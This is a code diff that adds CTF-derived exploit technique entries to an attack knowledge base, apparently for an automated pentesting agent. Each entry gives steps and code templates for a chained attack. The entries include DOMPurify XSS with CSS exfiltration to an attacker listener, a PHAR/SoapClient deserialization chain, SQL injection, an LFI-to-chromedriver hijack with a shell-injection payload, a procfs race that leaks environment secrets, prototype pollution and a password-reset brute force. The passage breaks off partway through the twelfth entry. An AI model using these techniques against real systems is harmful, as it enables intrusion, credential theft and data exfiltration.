@@ -2947,6 +2947,1044 @@ TECHNIQUES: list[dict] = [
                      "environment-variable", "docker", "privilege-escalation", "language-extension"],
         },
     },
+
+    # ══════════════════════════════════════════════════════════════════════
+    # CTF-validated exploit techniques (17)
+    # ══════════════════════════════════════════════════════════════════════
+
+    # ── T-01 ──────────────────────────────────────────────────────────────
+    {
+        "name": "dompurify_namespace_mutation_css_cue_webvtt_blind_exfil",
+        "vuln_type": "xss",
+        "sub_technique": "dompurify_namespace_css_cue",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["dompurify", "namespace", "webvtt", "css-injection", "blind", "bot", "cue"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "DOMPurify 3.x namespace mutation + CSS ::cue(voice) blind exfil via WebVTT <track>",
+            "applies_when": (
+                "DOMPurify 3.1.6 is used to sanitize HTML that is injected into a <video> element's "
+                "innerHTML. The `<svg><x:foreignObject>` pattern causes namespace-based mutation: the "
+                "inner HTML (including <style>) survives sanitization. A <track> element loading a "
+                "localhost endpoint as WebVTT enables CSS ::cue(v[voice^=...]) attribute matching, "
+                "creating a character-by-character blind oracle."
+            ),
+            "prerequisites": [
+                "DOMPurify 3.1.6 with namespace mutation bug",
+                "Target element is <video> with innerHTML injection",
+                "Bot visits attacker-controlled URL on localhost origin",
+                "Endpoint returns user-controlled text (IP-gated to 127.0.0.1)",
+                "Attacker has a public HTTP listener for callback",
+            ],
+            "technique_steps_md": (
+                "1. Craft `/review?text=WEBVTT\\n\\n00:00.000 --> 00:59.000\\n<v` so the response "
+                "becomes valid WebVTT with `<v {FLAG}` as voice cue.\n"
+                "2. Build XSS payload: `<svg><x:foreignObject><p><style>` with CSS rules like "
+                "`#videoEl::cue(v[voice^='prefix']){background:url(http://LISTENER/m?i=N)}`.\n"
+                "3. Append `<track src='/review?text=...' default kind='captions'>` to load the WebVTT.\n"
+                "4. Submit via `/report` so the bot renders the page.\n"
+                "5. Listener receives callback for the matching character. Extend prefix and repeat.\n"
+                "6. Stop when `}` is recovered."
+            ),
+            "code_template": (
+                "xss = ('<svg><x:foreignObject><p><style>'\n"
+                "       + ''.join(f'#videoEl::cue(v[voice^=\\'{prefix}{ch}\\'])'\n"
+                "                 f'{{background:url({listener}/m?tok={tok}&i={i})}}'\n"
+                "                 for i, ch in enumerate(charset))\n"
+                "       + '</style></p></x:foreignObject></svg>'\n"
+                "       + f'<track src=\\'/review?text={vtt_encoded}\\' default kind=\\'captions\\'>')"
+            ),
+            "examples": [{
+                "params": {
+                    "dompurify_version": "3.1.6",
+                    "target_element": "video#videoEl",
+                    "oracle_endpoint": "/review?text=... (IP-gated 127.0.0.1)",
+                    "blind_charset": "printable ASCII (33-126)",
+                },
+                "notes": (
+                    "Each round recovers one character. Total ~78 rounds for a typical flag. "
+                    "The namespace mutation `<x:foreignObject>` is key — DOMPurify strips the "
+                    "foreign element but its children (<style>) survive and execute in HTML context."
+                ),
+            }],
+            "tags": ["dompurify", "namespace", "webvtt", "css-injection", "blind", "bot", "cue"],
+        },
+    },
+    # ── T-02 ──────────────────────────────────────────────────────────────
+    {
+        "name": "phar_soapclient_crlf_bcrypt_72byte_truncation",
+        "vuln_type": "deserialization",
+        "sub_technique": "phar_soapclient_crlf",
+        "category": "exploitation",
+        "safety_level": "destructive",
+        "tags": ["phar", "soapclient", "crlf", "ssrf-loopback", "bcrypt", "auth-bypass", "php"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "PHAR metadata SoapClient gadget + CRLF User-Agent injection + bcrypt 72-byte truncation brute",
+            "applies_when": (
+                "The application calls file_exists() or file_get_contents() on a user-controlled "
+                "path that accepts phar:// wrapper. PHAR metadata deserialization triggers a "
+                "SoapClient gadget chain. The admin verification uses password_verify() on a "
+                "bcrypt hash of `str_repeat('B',70).KEY` — bcrypt only compares the first 72 bytes, "
+                "so only KEY[0:2] needs brute-forcing (3844 attempts)."
+            ),
+            "prerequisites": [
+                "phar:// wrapper reachable via file_exists/file_get_contents on user input",
+                "PHP 7.4 with SoapClient available (not disabled in php.ini)",
+                "Admin elevation endpoint restricted to 127.0.0.1 with password_verify check",
+                "bcrypt PASSWORD_BCRYPT with known prefix (B*70)",
+                "File upload endpoint accepting PNG",
+            ],
+            "technique_steps_md": (
+                "1. Build PNG-stub PHAR with serialized ImageModel wrapping SoapClient.\n"
+                "2. Set SoapClient._user_agent to CRLF-smuggled POST body + "
+                "`Cookie: PHPSESSID=<chosen_sid>`.\n"
+                "3. Upload the PHAR as PNG.\n"
+                "4. Trigger deserialization: `/?path=/view&img=phar://<uploaded>/x.txt`.\n"
+                "5. SoapClient fires HTTP to `http://127.0.0.1/?path=/admin` with "
+                "`VerifyToken=B*70+c1+c2` in POST body.\n"
+                "6. Brute-force c1,c2 over [A-Za-z0-9] (3844 combos) until the target "
+                "PHPSESSID gains admin=true.\n"
+                "7. Read `/flag` using that session."
+            ),
+            "code_template": (
+                "stub = base64.b64decode(PNG_1x1) + b'<?php __HALT_COMPILER(); ?>\\r\\n'\n"
+                "meta = serialize(ImageModel(file=SoapClient(location='http://127.0.0.1/?path=/admin',\n"
+                "                                            _user_agent=crlf_payload)))\n"
+                "phar = build_phar(stub, meta, 'x.txt', b'x')\n"
+                "upload(session, phar)\n"
+                "trigger(session, f'phar://{filename}/x.txt')\n"
+                "# poll /?path=/flag with PHPSESSID=chosen_sid"
+            ),
+            "examples": [{
+                "params": {
+                    "php_version": "7.4.27",
+                    "key_charset": "[A-Za-z0-9]",
+                    "brute_space": "62*62 = 3844",
+                    "gadget": "ImageModel -> SoapClient.__call() -> HTTP request",
+                },
+                "notes": (
+                    "The bcrypt 72-byte limit is the critical insight. The full KEY is 100 bytes "
+                    "but only the first 2 characters matter for password_verify. Cookie injection "
+                    "via User-Agent CRLF allows session fixation on the target PHPSESSID."
+                ),
+            }],
+            "tags": ["phar", "soapclient", "crlf", "ssrf-loopback", "bcrypt", "auth-bypass", "php"],
+        },
+    },
+    # ── T-03 ──────────────────────────────────────────────────────────────
+    {
+        "name": "sqli_union_select_native_crypto_unicorn_emulation",
+        "vuln_type": "sqli",
+        "sub_technique": "union_select_encrypted_download",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["sqli", "union", "android", "native-lib", "unicorn", "aes", "reverse-engineering"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "SQL injection UNION SELECT + encrypted file download + Unicorn native decryption emulation",
+            "applies_when": (
+                "An Android DRM app's API has SQLi in the `id` parameter of `request_book`. "
+                "The server returns a download token + fileKey. The downloaded file is encrypted "
+                "by a native library (libnative-lib.runtime.so) with a custom AES-like cipher. "
+                "Paths, headers, and keys are RC4-obfuscated in APK resources."
+            ),
+            "prerequisites": [
+                "APK decompilation to recover hidden API paths and auth headers",
+                "SQL injection in request_book?id= parameter",
+                "Extracted .so from APK's lib/ directory",
+                "Unicorn emulator (or actual Android device) to run native decryption",
+            ],
+            "technique_steps_md": (
+                "1. Decompile APK, extract RC4-encrypted paths/headers from resources.\n"
+                "2. Send `request_book?id=1 UNION SELECT '/flag'` with recovered UA + Auth headers.\n"
+                "3. Download encrypted blob via `/download/<token>`.\n"
+                "4. Parse fileKey: key16=fileKey[0:16], nonce12=fileKey[16:28], trailer=last 16 bytes.\n"
+                "5. Load libnative-lib.runtime.so into Unicorn (x86_64).\n"
+                "6. Stub libc calls (malloc, calloc, free, memset, memcpy).\n"
+                "7. Hook 0x6B100 to return 0 (force software crypto path).\n"
+                "8. Call: 0x6B200(key_schedule) -> 0x6A8F0(derive_state) -> 0x6ADC0(decrypt_stream).\n"
+                "9. Read plaintext flag from emulator memory."
+            ),
+            "code_template": (
+                "from unicorn import Uc, UC_ARCH_X86, UC_MODE_64\n"
+                "emu = Uc(UC_ARCH_X86, UC_MODE_64)\n"
+                "emu.mem_map(M_BASE, 0x500000)\n"
+                "emu.mem_write(M_BASE, Path(LIB_PATH).read_bytes())\n"
+                "# hook libc stubs + force software path\n"
+                "call(0x6B200, [key_ctx+0x10, key_ptr, 16])\n"
+                "call(0x6A8F0, [key_ctx, 16, nonce_ptr, tmp_ptr])\n"
+                "call(0x6ADC0, [tmp_ptr+0x18, nonce_len, trailer_ptr, ct_ptr, ct_len, out_ptr])"
+            ),
+            "examples": [{
+                "params": {
+                    "sqli_payload": "1 UNION SELECT '/flag'",
+                    "hidden_headers": "RC4-encrypted UA and Bearer token extracted from APK resources",
+                },
+                "notes": (
+                    "The APK stores all sensitive strings (paths, headers) encrypted with RC4. "
+                    "The native crypto uses a 3-step initialization that must be called in exact order. "
+                    "Hooking the hardware-detection function to return 0 forces the software fallback path."
+                ),
+            }],
+            "tags": ["sqli", "union", "android", "native-lib", "unicorn", "aes", "reverse-engineering"],
+        },
+    },
+    # ── T-04 ──────────────────────────────────────────────────────────────
+    {
+        "name": "text_fragment_scroll_lazy_img_blind_exfil",
+        "vuln_type": "xss",
+        "sub_technique": "text_fragment_scroll_oracle",
+        "category": "exploitation",
+        "safety_level": "safe",
+        "tags": ["text-fragment", "scroll-oracle", "lazy-loading", "blind", "emoji", "dompurify", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "Text Fragment (#:~:text=) scroll oracle + lazy loading image blind exfil",
+            "applies_when": (
+                "The target uses DOMPurify (default config allows loading=lazy). Content is "
+                "rendered in a scrollable page. The bot supports Text Fragments (#:~:text=). "
+                "The secret (username) uses emoji characters, which count as individual words "
+                "under Unicode Text Segmentation (UAX#29), making per-character matching possible."
+            ),
+            "prerequisites": [
+                "DOMPurify with default config (allows loading='lazy' on images)",
+                "Bot that navigates via driver.get() (user activation for text fragments)",
+                "Secret composed of emoji (each emoji = one word boundary unit)",
+                "Ability to create multiple documents with controlled content",
+            ],
+            "technique_steps_md": (
+                "1. Create 16 documents, each containing `<br>*200` (spacer) + "
+                "`asdf<img src='http://LISTENER/{i}' loading='lazy'>`.\n"
+                "2. For each character position, submit 16 bot requests:\n"
+                "   `http://localhost:3000/view/{doc}#:~:text={emoji_candidate}&text=asdf`\n"
+                "3. If the emoji matches the page's admin username, the browser scrolls to the "
+                "top match — the lazy image at the bottom does NOT load.\n"
+                "4. If the emoji doesn't match, the browser scrolls to the bottom 'asdf' — "
+                "the lazy image DOES load and triggers a callback.\n"
+                "5. The missing callback reveals the correct character.\n"
+                "6. Repeat for all 12 characters of the admin username."
+            ),
+            "code_template": (
+                "characters = ['\\U0001F47B', '\\U0001F92A', ...] # 16 emoji candidates\n"
+                "for i in range(16):\n"
+                "    s.post(f'{BASE}/bot', data={\n"
+                "        'url': f'http://localhost:3000/view/{i+2}#:~:text=Username: {characters[i]}&text=asdf'\n"
+                "    })"
+            ),
+            "examples": [{
+                "params": {
+                    "charset": "16 emoji characters per round",
+                    "total_rounds": "12 (username length)",
+                    "oracle_signal": "absence of HTTP callback = correct character match",
+                },
+                "notes": (
+                    "Text Fragments were designed with scroll-to-text leakage in mind, but the "
+                    "mitigation (word-boundary matching only) is bypassed because emoji count as "
+                    "individual words under Unicode segmentation rules."
+                ),
+            }],
+            "tags": ["text-fragment", "scroll-oracle", "lazy-loading", "blind", "emoji", "dompurify", "bot"],
+        },
+    },
+    # ── T-05 ──────────────────────────────────────────────────────────────
+    {
+        "name": "lfi_self_cmdline_xss_chromedriver_hijack_composer_rce",
+        "vuln_type": "rce",
+        "sub_technique": "lfi_chromedriver_hijack_composer_exec",
+        "category": "exploitation",
+        "safety_level": "destructive",
+        "tags": ["lfi", "procfs", "self-cmdline-xss", "chromedriver", "webdriver", "composer", "shell-injection"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "LFI → self-cmdline XSS → chromedriver session hijack → Composer fallback exec() RCE",
+            "applies_when": (
+                "A Go web app has arbitrary file read via /profile/{path}. A bot (Puppeteer/Chrome) "
+                "visits attacker-controlled URLs on localhost. An admin panel (Automad) runs on the "
+                "same network with a vulnerable Composer package-manager install endpoint that passes "
+                "user input to exec() in a fallback path."
+            ),
+            "prerequisites": [
+                "/profile/{path} arbitrary file read (Go app, no path sanitization)",
+                "Bot with chromedriver running on same host",
+                "/proc filesystem accessible (Linux container)",
+                "Automad 2.0.0-beta.17 with package-manager install endpoint",
+                "Public listener for cmd.js/cfg.js relay",
+            ],
+            "technique_steps_md": (
+                "1. Read /proc/loadavg to get last PID → predict next bot PID.\n"
+                "2. Submit report: `/profile/proc/{next_pid}/cmdline%3f<svg/onload=eval(atob('...'))>`\n"
+                "3. Bot opens its own /proc/cmdline → SVG executes in localhost origin (self-cmdline XSS).\n"
+                "4. XSS loads external cmd.js which polls cfg.js for staged commands.\n"
+                "5. LFI scan /proc/*/comm for 'chromedriver', read /proc/{pid}/cmdline for --port.\n"
+                "6. Read /proc/{pid}/maps + /proc/{pid}/mem → extract WebDriver session ID from memory.\n"
+                "7. From localhost-origin JS, send blind WebDriver commands:\n"
+                "   - /url → navigate to admin-app\n"
+                "   - /execute/async → run JS in admin-app origin\n"
+                "8. Admin-app JS: POST /_api/package-manager/install with\n"
+                "   `package=--repository;cat /flag.txt >/var/www/html/automad/cache/flag_read.txt;#`\n"
+                "9. Fetch /cache/flag_read.txt → exfil to listener."
+            ),
+            "code_template": (
+                "# self-cmdline XSS loader (base64-encoded):\n"
+                "loader = \"var s=document.createElement('script');\"\n"
+                "        f\"s.src='{exfil}/cmd.js?t='+Date.now();\"\n"
+                "        \"document.body.appendChild(s)\"\n"
+                "path = f'/profile/proc/{next_pid}/cmdline%3f<svg/onload=eval(atob(\\'{b64(loader)}\\'))>'\n"
+                "# Composer shell injection:\n"
+                "package = '--repository;cat /flag.txt >/var/www/html/automad/cache/flag_read.txt;#'"
+            ),
+            "examples": [{
+                "params": {
+                    "three_security_boundaries": [
+                        "public app LFI (Go)",
+                        "bot browser localhost-origin JS",
+                        "admin-app server-side exec (Automad/Composer)",
+                    ],
+                    "shell_injection_reason": (
+                        "Composer::run() tries API first, gets exception from --repository, "
+                        "falls back to exec() with unquoted $command → ; metachar interpreted"
+                    ),
+                },
+                "notes": (
+                    "Five-stage chain crossing three security boundaries. The self-cmdline XSS "
+                    "technique is particularly novel: the bot reads its own /proc/PID/cmdline "
+                    "which contains the attacker's SVG payload from the URL."
+                ),
+            }],
+            "tags": ["lfi", "procfs", "self-cmdline-xss", "chromedriver", "webdriver", "composer", "shell-injection"],
+        },
+    },
+    # ── T-06 ──────────────────────────────────────────────────────────────
+    {
+        "name": "procfs_toctou_fd_swap_environ_leak",
+        "vuln_type": "race_condition",
+        "sub_technique": "procfs_fd_toctou",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["path-traversal", "procfs", "toctou", "race", "environ", "fd-swap"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "Path traversal empty segment + /proc/self/fd/N TOCTOU race → environ FLAG leak",
+            "applies_when": (
+                "A router regex allows empty path segments (e.g. `..etc.passwd` via `..proc.self.fd.20`), "
+                "enabling path traversal. The server does stat() then open() on /proc/self/fd/N, "
+                "creating a TOCTOU window. By holding fd20 on a large file and swapping it to "
+                "/proc/self/environ between stat and open, the environ bytes are leaked."
+            ),
+            "prerequisites": [
+                "Path traversal via empty regex segments in router",
+                "Linux /proc filesystem accessible",
+                "FLAG stored in environment variable",
+                "Low-latency network access (local shell preferred for reliable race win)",
+            ],
+            "technique_steps_md": (
+                "1. Open 5 connections holding /proc/self/fd/20 on a large file (e.g. /usr/local/bin/node).\n"
+                "2. Start target read: GET /query/view/..proc.self.fd.20\n"
+                "3. After brief random delay, close one holder.\n"
+                "4. Rapidly open 6 connections to /query/view/..proc.self.environ (reassigns fd 20).\n"
+                "5. Read target response — if environ hit, body starts with 'U','P','F' etc.\n"
+                "6. Extract FLAG from bytes: regex `FLAG=([^\\x00]+)`.\n"
+                "7. Repeat up to 200k iterations (typical success within thousands)."
+            ),
+            "code_template": (
+                "R_BIG = rq('/query/view/..usr.local.bin.node')\n"
+                "R_ENV = rq('/query/view/..proc.self.environ')\n"
+                "R_TGT = rq('/query/view/..proc.self.fd.20')\n"
+                "holders = [connect(R_BIG) for _ in range(5)]\n"
+                "target = connect(R_TGT)\n"
+                "sleep(random(0.001, 0.0025))\n"
+                "holders[0].close()  # free fd slot\n"
+                "for _ in range(6): e = connect(R_ENV); sleep(random()); e.close()  # race swap"
+            ),
+            "examples": [{
+                "params": {
+                    "traversal_pattern": "..proc.self.fd.20 (dots replace /)",
+                    "race_target": "/proc/self/fd/20",
+                    "env_var": "FLAG",
+                },
+                "notes": (
+                    "External network adds too much jitter. Running from the local shell port (SSH) "
+                    "dramatically increases success rate. The race window is between stat() and open() "
+                    "of the procfs fd symlink."
+                ),
+            }],
+            "tags": ["path-traversal", "procfs", "toctou", "race", "environ", "fd-swap"],
+        },
+    },
+    # ── T-07 ──────────────────────────────────────────────────────────────
+    {
+        "name": "absolute_form_request_differential_range_byte_oracle",
+        "vuln_type": "information_disclosure",
+        "sub_technique": "differential_range_byte_oracle",
+        "category": "exploitation",
+        "safety_level": "safe",
+        "tags": ["differential", "range", "byte-oracle", "path-normalization", "blind"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "Absolute-form request target differential (Node vs Python) + Range single-byte oracle",
+            "applies_when": (
+                "A checker service compares responses from two backends (Node.js and Python) for "
+                "the same request. When given an absolute-form URL like "
+                "`http://attacker/../../a`, Node normalizes the path to `/a` (reads the flag file) "
+                "while Python treats it as a redirect to the attacker's server. The attacker's echo "
+                "server returns the guessed byte. Range header extracts one byte at a time."
+            ),
+            "prerequisites": [
+                "Checker comparing two backend responses for equality",
+                "Node.js backend that normalizes absolute-form request-targets",
+                "Python backend that follows redirects to the authority in the URL",
+                "Attacker-controlled HTTP server reachable from checker",
+            ],
+            "technique_steps_md": (
+                "1. Start echo server: returns body byte from `?b=XX` query param.\n"
+                "2. For each offset i, for each candidate byte b:\n"
+                "   GET `http://attacker/../../a?b={b:02x}` with `Range: bytes={i}-{i}`\n"
+                "3. Node reads `/a` (flag), returns byte at offset i.\n"
+                "   Python redirects to attacker, gets byte b.\n"
+                "4. If 'Responses match' in checker output → byte b is correct.\n"
+                "5. Append to recovered string. Stop at `}`."
+            ),
+            "code_template": (
+                "target = f'{guess_base}/../../a?b={byte:02x}'\n"
+                "resp = http_get(checker, target, headers={'Range': f'bytes={offset}-{offset}'})\n"
+                "if 'Responses match' in resp.body: found = byte"
+            ),
+            "examples": [{
+                "params": {
+                    "node_behavior": "normalizes absolute-form URI path → reads local /a",
+                    "python_behavior": "treats authority as redirect target → fetches from attacker",
+                    "flag_prefix": "DH{",
+                },
+                "notes": (
+                    "The differential behavior between Node and Python HTTP path handling is the core "
+                    "insight. Parallel threads (8+) speed up the byte search significantly."
+                ),
+            }],
+            "tags": ["differential", "range", "byte-oracle", "path-normalization", "blind"],
+        },
+    },
+    # ── T-08 ──────────────────────────────────────────────────────────────
+    {
+        "name": "csp_report_uri_secret_leak_css_attr_selector_blind_exfil",
+        "vuln_type": "xss",
+        "sub_technique": "csp_css_attribute_selector_blind",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["csp", "css-injection", "import", "attribute-selector", "blind", "redos", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "CSP report-uri secret leak + CSS attribute selector blind flag exfil + exponential var() ReDoS",
+            "applies_when": (
+                "A page has CSP with `style-src: http://127.0.0.1/secret.php` and `report-uri` "
+                "pointing to the attacker. An `@import` from secret.php loads a stylesheet containing "
+                "a secret token. CSP violations on blocked URIs leak the secret via report-uri. "
+                "The flag is rendered in an `<h1>` attribute. CSS `h1[flag^='prefix']` with "
+                "exponential `var()` nesting causes page-load delay (timing oracle) when matched."
+            ),
+            "prerequisites": [
+                "CSP style-src allowing localhost/secret.php",
+                "CSP report-uri set to attacker domain",
+                "Flag value in HTML attribute (inspectable by CSS)",
+                "Bot that follows meta-refresh redirects",
+            ],
+            "technique_steps_md": (
+                "1. Serve page with `<link rel=stylesheet href='http://127.0.0.1/secret.php?whatUwant=@import+\"'>`\n"
+                "2. CSP report contains blocked-uri → secret token extracted.\n"
+                "3. For each character position, redirect bot to:\n"
+                "   `http://127.0.0.1:8080/flag?secret=TOKEN&text=<style>h1[flag^=\"PREFIX+CHAR\"]{--a:url(/?1),...;--b:var(--a),...;...}</style><meta http-equiv=refresh ...>`\n"
+                "4. If prefix matches, exponential var() expansion causes significant delay.\n"
+                "5. Timeout / no-redirect-callback indicates match. Move to next char.\n"
+                "6. When no match triggers delay, previous char was the last → flag complete."
+            ),
+            "code_template": (
+                "csp_header = {'style-src': 'http://127.0.0.1/secret.php', 'report-uri': attacker_url}\n"
+                "css = f'h1[flag^=\"{prefix}{char}\"]{{--a:url(/?1),url(/?1),...;--b:var(--a),...;...}}'\n"
+                "redirect_url = f'http://127.0.0.1:8080/flag?secret={secret}&text={urlencode(css_page)}'"
+            ),
+            "examples": [{
+                "params": {
+                    "secret_leak": "CSP blocked-uri in report",
+                    "oracle": "exponential var() nesting → page load delay",
+                    "charset": "{_} + ascii_letters",
+                },
+                "notes": (
+                    "No JavaScript execution needed (JS-Less). The entire exfiltration is done via "
+                    "CSS attribute selectors and CSP reports. The exponential var() technique creates "
+                    "a reliable timing side-channel."
+                ),
+            }],
+            "tags": ["csp", "css-injection", "import", "attribute-selector", "blind", "redos", "bot"],
+        },
+    },
+    # ── T-09 ──────────────────────────────────────────────────────────────
+    {
+        "name": "proto_pollution_clear_survive_redos_logout_stored_xss",
+        "vuln_type": "prototype_pollution",
+        "sub_technique": "proto_clear_survive_redos_xss",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["prototype-pollution", "redos", "stored-xss", "session-race", "dayjs", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "__proto__ user session survives /clear → TIME_FORMAT pollution + ReDoS logout delay + stored XSS",
+            "applies_when": (
+                "An app stores user data as `accounts[username].content`. Creating a user named "
+                "`__proto__` and writing to it after /clear (which deletes all accounts but preserves "
+                "sessions) pollutes Object.prototype via `accounts['__proto__'].content`. dayjs format() "
+                "has O(n^2) regex behavior on certain inputs, usable to delay the event loop and "
+                "prevent /logout from completing before stored XSS executes."
+            ),
+            "prerequisites": [
+                "accounts['__proto__'].content structure pollutes Object.prototype",
+                "/clear deletes accounts but keeps sessions alive",
+                "dayjs format() with superlinear regex cost",
+                "Bot logs in as admin, visits attacker page, then hits /logout",
+                "Stored XSS (HTML in content rendered without sanitization)",
+            ],
+            "technique_steps_md": (
+                "1. Create `__proto__` account, login, call /clear → session persists.\n"
+                "2. Write TIME_FORMAT.content = 'YYYY-MM-DD HH:mm:ss' to leak viewtime.\n"
+                "3. Create attacker account (country=content), visit /view to get viewtime.\n"
+                "4. Call /check?day=<viewtime> to set checked=true.\n"
+                "5. Write stored XSS to attacker's content: repeatedly fetch /view?username=admin, "
+                "then login as attacker and /write flag to own page.\n"
+                "6. Change TIME_FORMAT.content to '[' * 20000 for ReDoS.\n"
+                "7. Trigger bot: /bot?path=/view?username=attacker.\n"
+                "8. Immediately send parallel /view?username=dos requests to delay event loop.\n"
+                "9. Bot's /logout is delayed → XSS runs with admin session → flag saved to attacker's view."
+            ),
+            "code_template": (
+                "# Phase 1: pollution\n"
+                "session.post(f'{BASE}/write', data={'content': 'YYYY-MM-DD HH:mm:ss'})  # as '__proto__' user\n"
+                "# Phase 2: stored XSS\n"
+                "xss = '<script>...fetch /view?username=admin...write flag...</script>'\n"
+                "# Phase 3: ReDoS\n"
+                "session.post(f'{BASE}/write', data={'content': '[' * 20000})  # as '__proto__'\n"
+                "# Phase 4: trigger\n"
+                "session.post(f'{BASE}/bot', data={'path': '/view?username=attacker'})"
+            ),
+            "examples": [{
+                "params": {
+                    "pollution_path": "accounts['__proto__'].content → Object.prototype.content",
+                    "redos_payload": "'[' * 20000 → dayjs format O(n^2)",
+                    "delay_achieved": "0.4-0.6s per /view request",
+                },
+                "notes": (
+                    "The ReDoS is not for denial-of-service but for a precise timing attack: "
+                    "delaying /logout just long enough for the stored XSS to execute with the "
+                    "admin's still-active session."
+                ),
+            }],
+            "tags": ["prototype-pollution", "redos", "stored-xss", "session-race", "dayjs", "bot"],
+        },
+    },
+    # ── T-10 ──────────────────────────────────────────────────────────────
+    {
+        "name": "password_reset_challenge_bruteforce_race",
+        "vuln_type": "race_condition",
+        "sub_technique": "reset_challenge_concurrent_bruteforce",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["race-condition", "password-reset", "bruteforce", "concurrent", "session-race"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "Password reset challenge brute-force with concurrent lock-breaker race",
+            "applies_when": (
+                "A password reset flow uses a secure-code challenge (pick 2 words from N). "
+                "The challenge_token is reusable for multiple submit attempts. A 'lock user' "
+                "technique keeps one valid pass_reset_token alive via concurrent password-change "
+                "requests, while worker threads brute-force the admin's 2-word challenge."
+            ),
+            "prerequisites": [
+                "Password reset with challenge (2 of N words, N=20 → 380 combos)",
+                "No rate limiting on challenge submission",
+                "challenge_token reusable across attempts",
+                "Admin UUID discoverable (e.g. from transfer logs)",
+                "Ability to create a lock user with known secure code",
+            ],
+            "technique_steps_md": (
+                "1. Sign up base user, login, find admin UUID from /api/cash/krw/log.\n"
+                "2. Create lock user (username=LOCK:{admin_uuid}), save secure code.\n"
+                "3. Get lock user's challenge_token, solve it (known words), get pass_reset_token.\n"
+                "4. Start 16 breaker threads: continuously call change_password(lock_pass_token, ...) "
+                "to keep the token alive.\n"
+                "5. Get admin's challenge_token, note the 2 required indices.\n"
+                "6. Start 100 worker threads: brute-force 380 word combinations against "
+                "admin's challenge_token.\n"
+                "7. On match: get admin's pass_reset_token → change admin password → login.\n"
+                "8. Read admin memo containing flag."
+            ),
+            "code_template": (
+                "combos = Queue()\n"
+                "for w1 in WORDS:\n"
+                "    for w2 in WORDS:\n"
+                "        if w1 != w2: combos.put((w1, w2))\n"
+                "# 16 lock-breaker threads + 100 brute-force workers\n"
+                "# On match → change_password(admin_pass_token, new_pw) → login('admin', new_pw)"
+            ),
+            "examples": [{
+                "params": {
+                    "word_count": 20,
+                    "combo_space": "20*19 = 380",
+                    "workers": 100,
+                    "breaker_threads": 16,
+                },
+                "notes": (
+                    "The lock-breaker trick is the key insight: by continuously exercising a valid "
+                    "pass_reset_token, it prevents the challenge_token from being invalidated, "
+                    "allowing unlimited brute-force attempts."
+                ),
+            }],
+            "tags": ["race-condition", "password-reset", "bruteforce", "concurrent", "session-race"],
+        },
+    },
+    # ── T-11 ──────────────────────────────────────────────────────────────
+    {
+        "name": "compression_dict_header_injection_dcz_mismatch_dom_xss",
+        "vuln_type": "xss",
+        "sub_technique": "compression_dict_mismatch_xss",
+        "category": "exploitation",
+        "safety_level": "cautious",
+        "tags": ["compression-dictionary", "dcz", "header-injection", "dom-xss", "dictionary-mismatch", "bot"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "Use-As-Dictionary header injection via title → dcz dictionary mismatch → DOM breakout XSS",
+            "applies_when": (
+                "A Flask app sets `Use-As-Dictionary` header using user-controlled title without "
+                "full Structured Header validation. The server does not verify the Available-Dictionary "
+                "hash from the browser. This allows an attacker to make the browser cache dictionary A "
+                "but the server compresses with dictionary B, causing dcz decompression mismatch that "
+                "corrupts HTML and breaks tag boundaries, enabling XSS."
+            ),
+            "prerequisites": [
+                "HTTPS proxy (secure context required for Compression Dictionary Transport)",
+                "Server uses user-controlled title in Use-As-Dictionary header",
+                "Server skips Available-Dictionary hash verification",
+                "Bot visits path1 then path2 (dictionary warmup + trigger)",
+                "External request bin (e.g. ptsv3.com) for exfiltration",
+            ],
+            "technique_steps_md": (
+                "1. Register/login via HTTPS proxy URL.\n"
+                "2. Create TARGET doc v1, visit /doc/{id}/1 to warm dict cache.\n"
+                "3. Create attacker doc with title injecting extra dict id binding:\n"
+                "   `title = 'AA\", match=\"/x\", ttl=1, id=\"dict-{target_id}-TARGET'`\n"
+                "4. Create v1 and v2 with crafted content pairs (c1/c2) designed so that "
+                "post-mismatch decompression produces executable `<img onerror=...>` tags.\n"
+                "5. Submit to /bot: path1=doc/{atk}/1, path2=doc/{atk}/2.\n"
+                "6. Bot loads path1 (dictionary cached), then path2 (dcz mismatch → DOM XSS).\n"
+                "7. XSS fetches /admin and POSTs body to ptsv3.com.\n"
+                "8. Poll ptsv3 API for flag."
+            ),
+            "code_template": (
+                "inj_title = f'AA\", match=\"/x\", ttl=1, id=\"dict-{target_id}-TARGET'\n"
+                "s.post(f'{base}/upload', data={'title': inj_title, 'content': c1})\n"
+                "s.post(f'{base}/edit/{atk_id}', data={'title': inj_title+'-v2', 'content': c2})\n"
+                "s.post(f'{base}/bot', data={'path1': f'doc/{atk_id}/1', 'path2': f'doc/{atk_id}/2'})"
+            ),
+            "examples": [{
+                "params": {
+                    "header_injection": 'title containing `"` to break Structured Header field',
+                    "dcz_mismatch": "browser dict A vs server dict B → corrupted decompression",
+                    "xss_trigger": "onerror handler in corrupted DOM",
+                },
+                "notes": (
+                    "Compression Dictionary Transport (CDT) is a relatively new browser feature. "
+                    "The attack exploits the gap between browser-side dictionary and server-side "
+                    "dictionary when hash verification is missing."
+                ),
+            }],
+            "tags": ["compression-dictionary", "dcz", "header-injection", "dom-xss", "dictionary-mismatch", "bot"],
+        },
+    },
+    # ── T-12 ──────────────────────────────────────────────────────────────
+    {
+        "name": "lodash_set_mongoose_populate_sift_where_rce",
+        "vuln_type": "prototype_pollution",
+        "sub_technique": "lodash_set_mongoose_sift_rce",
+        "category": "exploitation",
+        "safety_level": "destructive",
+        "tags": ["prototype-pollution", "lodash", "mongoose", "sift", "where", "rce", "nodejs", "blacklist-bypass"],
+        "attack_metadata": {
